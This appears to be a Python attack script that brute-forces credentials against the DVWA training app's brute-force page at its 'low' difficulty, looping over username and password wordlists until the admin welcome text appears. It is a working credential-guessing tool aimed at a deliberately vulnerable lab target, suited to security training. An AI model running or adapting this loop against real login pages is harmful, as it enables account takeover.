#!/usr/bin/env python3

import requests

from conf import BASE_URL
from util import http_get

USERNAME_WORDLISTS = "./src/bruteforce/username.txt"
PASSWORD_WORDLISTS = "./src/bruteforce/passwords.txt"

DIFFICULTY = "low"

def bruteforce_low():
    global USERNAME_WORDLISTS, PASSWORD_WORDLISTS
    
    usernames = get_wordlist(USERNAME_WORDLISTS)
    passwords = get_wordlist(PASSWORD_WORDLISTS)
    
    print(f"[INFO]: Loaded {len(usernames)} usernames")
    print(f"[INFO]: Loaded {len(passwords)} passwords")
    
    for user in usernames:
        for password in passwords:
            if check_credentials(user, password):
                print(f"[INFO]: Found credentials: ({user}:{password})")
                break

# -----------------------

def get_wordlist(wordlist_path):
    return open(wordlist_path, "r").read().splitlines()

# -----------------------

def check_credentials(username, password):
    global BASE_URL, DIFFICULTY
    
    URL = BASE_URL + "/vulnerabilities/brute/"
    params = {"username": username, "password": password, "Login": "Login"}
    r = http_get(URL, DIFFICULTY, params=params)
    return "Welcome to the password protected area admin" in r.text
